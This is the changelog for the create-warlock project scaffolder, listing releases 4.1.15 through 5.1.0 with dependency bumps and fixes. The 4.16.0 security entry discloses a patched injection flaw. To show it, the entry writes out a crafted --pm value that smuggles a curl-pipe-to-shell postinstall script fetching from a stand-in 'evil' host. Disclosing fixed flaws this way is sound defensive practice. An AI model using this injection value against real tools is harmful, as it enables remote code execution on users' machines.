# Changelog — create-warlock

All notable changes to `create-warlock` are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/). `@warlock.js/*` packages are released in lockstep — every package shares the same version number, so a version below may list only the changes that affected this package.

## 5.1.0

> **If your scaffold includes the `web` feature, upgrade.** React did not execute at all
> in published installs of `@warlock.js/web` 5.0.0 through 5.0.2 — see that package's
> changelog for the defect and its fix.

### Added

- **The scaffold typechecks from a fresh install, and a CI gate keeps it that way.** A
  newly created project previously could fail `tsc` on its own generated source.
- **A real home page**, replacing the placeholder — it includes a counter whose working
  state is proof that hydration actually ran in the browser.

### Changed

- **`src/typings.d.ts` is now the sanctioned home for `RequestLocals` / `RequestUser`
  module augmentation.** The file is generated with both augmentation blocks stubbed and
  commented, so there is one obvious place to declare per-request typed data.
- Replaced stale scaffold values that had been carried forward: the `wow2` project name
  and the `4.15.0` dependency version no longer appear in generated projects.

## 5.0.2 - 2026-08-25

No changes to `create-warlock`. Released in lockstep with the `@warlock.js/web` SSR fix
(`ssr.noExternal`) — see that package's changelog.

## 5.0.1 - 2026-08-25

### Fixed

- **The `warlock` binary was never linked in a yarn-1 scaffold.** Installing the batched
  features under yarn 1 hit an *Invariant Violation* in yarn's linker, which aborted the
  install before `node_modules/.bin` was written — leaving a scaffolded project whose
  own `warlock` command did not exist. `App.pinViteResolution()` now writes matching
  `resolutions` and `overrides` entries for vite into the generated `package.json`
  *before* the batched feature install runs, so a single vite version is resolved and
  the linker completes.

## 5.0.0 - 2026-08-25

### Added

- The project creator now offers the `web` feature for Warlock SSR pages.

### Changed

- Scaffold command failures are captured and reported instead of allowing later success output to hide a failed dependency install, Git initialization, feature addition, or cache warm-up.
- Generated route handlers use the new request-context argument shape, and generated cache configuration honors `CACHE_DRIVER`.

## 4.16.0 - 2026-08-18

### Security

- **`--pm` is now validated against an allow-list (`npm`/`yarn`/`pnpm`/`bun`) before it reaches anything.** Previously an arbitrary `--pm` string flowed straight into `spawn()` as the executable to run *and* was spliced verbatim into the generated `package.json`'s script text before that text is parsed as JSON — a crafted value (e.g. `--pm='pnpm","postinstall":"curl${IFS}evil.sh|sh#'`) could inject a `postinstall` script that the scaffolder's own automatic `install()` step would then execute, or invoke an arbitrary binary on `PATH` outright. `--yes`/non-interactive scaffolds now reject any `--pm` outside the allow-list and exit before the package manager is set, closing both sinks at the source; the interactive prompt was already safe (its options are drawn from the allow-list, never free text).

### Dependencies

- Bumped `@mongez/reinforcements` to `^4.0.1` (package dependency + project template). This is a **major** bump: `Random.string/nanoid/id/token/uuid` are now CSPRNG-backed (WebCrypto) and no longer honor `Random.seed()`, and throw without WebCrypto available. Audited `create-warlock`'s own source and the `templates/warlock` scaffold for `Random.seed`/`Random.*` usage — none found, no code changes required.
- Project template (`templates/warlock/package.json`) `@mongez/*` deps bumped: `@mongez/localization` to `^3.4.7`, `@mongez/supportive-is` to `^2.1.4`, `@mongez/agent-kit` to `^1.2.1`.
- Project template `@warlock.js/*` deps were pinned at the stale `4.0.119` — rewritten to the current lockstep version `4.15.0` to match the published `@warlock.js/*` packages.

## 4.12.0

### Changed

- Declares its own test runner and pins it to an exact version (`vitest@4.1.10`). The package is its own repository, so a runner resolved from a workspace root it may not be cloned with is a runner it cannot rely on. The pin is exact rather than a range because the version moved underneath the suite mid-development on an unrelated install — a suite whose runner can change without anyone choosing it proves less than it appears to

## 4.7.0

### Added

- Non-interactive scaffolding — `create-warlock <name> --yes` (with `--db`, `--pm`, `--features`, `--ai`, `--git`, `--jwt`) scaffolds the entire app in a single command, no prompts
- `--db=none` / `--no-db` and a **None** option in the database prompt — scaffold with no database: the driver, its package, and `src/config/database.ts` are all skipped

### Changed

- Starter models drop the baked-in `globalColumnsSchema` audit columns (`createdBy` / `updatedBy` / `deletedBy` / `isActive`) — global columns are left to the developer

## 4.2.11

### Changed

- Bumped `@mongez/reinforcements` to 3.3.0 (package dependency + project template)

## 4.2.10

### Changed

- The project template now pins the latest `@mongez/*` versions (`@mongez/reinforcements@^3.2.0`, `@mongez/agent-kit@^1.2.0`) so freshly scaffolded apps start on current dependencies. (`@warlock.js/*` versions are still rewritten to the scaffolder's own version at install time.)

## 4.2.7

### Fixed

- The published package now ships its `templates/` folder, so scaffolding a new project works from the installed package — it was missing from the build, which failed the wizard with "Something went wrong" at the template-copy step.

## 4.2.6

### Fixed

- The published package now ships its `bin` folder again, so the `create-warlock` CLI works from the installed package — it was omitted from the 4.2.5 build.

## 4.2.5

- The feature wizard now offers **Notifications** (`@warlock.js/notifications`) under "Jobs & Messaging" — opt-in; selecting it delegates to `warlock add notifications` (ejects config + scaffolds the in-app model/migration).

## 4.1.15

- Baseline — per-package changelog tracking starts at this version.
